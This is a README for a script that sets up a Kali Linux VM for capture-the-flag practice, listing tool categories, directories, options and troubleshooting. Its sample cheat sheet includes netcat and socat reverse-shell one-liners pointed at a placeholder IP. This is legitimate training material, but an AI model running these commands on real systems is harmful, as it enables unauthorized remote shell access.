# 🛡️ Kali Linux CTF VM Setup

Automated setup for a Kali Linux Virtual Machine optimized for Capture The Flag (CTF) competitions.

> **Version:** 1.0-FINAL  
> **Date:** December 3, 2025  
> **Tested On:** Kali Linux 2025.x  
> **Author:** Frederick Pellerin  
> **Website:** [www.therealfred.ca](https://www.therealfred.ca)    
> **License:** MIT

## 📋 Overview

This project provides an automated setup script that configures a Kali Linux VM specifically for CTF competitions. It installs essential tools organized by category, creates a structured directory layout, configures useful aliases, and applies security enhancements.

The modular approach allows you to selectively install only the tools you need, reducing bloat while ensuring you have everything required for various CTF challenges.

## 🚀 Key Features

- **Modular Installation**: Choose which tool categories to install
- **Organized Structure**: Predefined directory layout for CTF organization
- **Essential Tools**: Comprehensive toolset for all major CTF categories
- **Security Hardening**: Firewall configuration and service management
- **Customization**: Optional enhancements like Zsh, Nerd Fonts, and ProxyChains
- **Logging**: Setup progress logged to `/root/ctf_setup.log`
- **Verification**: Automated verification of installed tools
- **Snapshot Ready**: Prepared for VM snapshot creation
- **Error Handling**: Robust error handling with graceful fallbacks
- **User-Friendly**: Interactive prompts with clear warnings

## 📦 Installation

1. **Download the Script**
   ```bash
   wget -O install.sh https://raw.githubusercontent.com/TheRealFredP3D/Kali-VM-Setup/main/install.sh
   ```

2. **Make it Executable**
   ```bash
   chmod +x install.sh
   ```

3. **Run as Root**
   ```bash
   sudo ./install.sh
   ```

The script will prompt you to install optional components.

## 🧰 Tool Categories

The script installs tools in the following categories:

- **Core Tools**: nmap, netcat-traditional, tcpdump, wireshark, git, python3, etc.
- **Reconnaissance**: gobuster, ffuf, amass, whatweb, nikto, enum4linux, etc.
- **Web Exploitation**: burpsuite, sqlmap, wfuzz, zaproxy, wafw00f, etc.
- **Reverse Engineering**: ghidra, radare2, gdb, peda, binwalk, etc.
- **Forensics**: foremost, sleuthkit, steghide, stegosuite, etc.
- **Password Cracking**: john, hashcat, hydra, medusa, etc.
- **Exploit Development**: metasploit-framework, pwntools, ropper, etc.

## 🗂️ Directory Structure

The script creates an organized directory structure at `/home/$USER/CTF/`:

```
CTF/
├── binaries/      # Binary exploitation challenges
├── crypto/        # Cryptography challenges
├── forensics/     # Forensics challenges
├── notes/         # Notes and cheat sheets
│   ├── notes.md
│   └── cheatsheet.md
├── pwn/           # Pwn challenges
├── reversing/     # Reverse engineering challenges
├── tools/         # Additional tools and wordlists
├── venv/          # Python virtual environment
├── web/           # Web exploitation challenges
└── writeups/      # Challenge writeups
```

## ⚙️ Optional Enhancements

You'll be prompted to install these optional components:

- **Zsh & Oh My Zsh**: Enhanced shell with plugins
- **Nerd Fonts**: Improved terminal font support
- **ProxyChains**: Network proxy configuration
- **Visual Studio Code**: Code editor
- **Docker Testbeds**: DVWA and Vulnix for practice
- **Passwordless Sudo**: Convenience setting for isolated VMs
- **SecLists**: Comprehensive wordlists (~2GB download)

## 🔒 Security Features

- UFW firewall with outbound rules for HTTP, HTTPS, DNS
- Disabled unnecessary services (bluetooth, cups)
- Optional passwordless sudo for isolated environments
- Increased file watch limits for better performance
- User directory validation and sanitization

## ✅ Verification

The script automatically verifies installation of key tools:
- nmap, burpsuite, sqlmap, john
- SecLists wordlists (if installed)
- Network connectivity
- Firewall status

## 🔧 Troubleshooting

| Issue | Solution |
|-------|----------|
| Network not working | Check VirtualBox/VMware adapter settings |
| Script fails | See `/root/ctf_setup.log` for detailed error information |
| Tool missing | Try reinstalling: `sudo apt install -y <tool>` |
| Fonts not applied | Run `fc-cache -fv` and restart terminal |
| Zsh not loaded properly | Run `source ~/.zshrc` as user |
| Permission denied | Ensure running with `sudo` |
| John verification fails | John doesn't support `--version` flag (handled automatically) |

## 📝 Sample Cheat Sheet

Example from `cheatsheet.md`:

```markdown
## Reverse Shells
- Netcat: `nc -e /bin/bash 10.10.10.10 4444`
- Socat: `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444`

## Common Commands
- Nmap: `nmap -sC -sV -Pn <target>`
- Gobuster: `gobuster dir -u <url> -w ~/tools/SecLists/Discovery/Web-Content/common.txt`
```

## 💾 Post-Setup Steps

1. Shut down the VM
2. Create a snapshot called `CTF Base`
3. Start solving challenges on:
   - [TryHackMe](https://tryhackme.com/)
   - [Hack The Box](https://hackthebox.com/)
   - [PicoCTF](https://picoctf.org/)

## � Version History

- **v1.0-FINAL**: Production-ready version with comprehensive error handling
- Fixed John verification (removed unsupported --version flag)
- Fixed service disabling (handle missing services gracefully)
- Improved user directory validation and sanitization
- Enhanced logging and error reporting

## �📬 Customization

This setup can be extended into:
- Ansible or Docker-based reproducible labs
- Versioned GitHub repository
- Headless setup flow with install flags
- Additional tool categories and custom configurations

## 🤝 Contributing

Feel free to submit issues, feature requests, or pull requests to improve this setup script.

Happy Hacking! 🐱‍💻
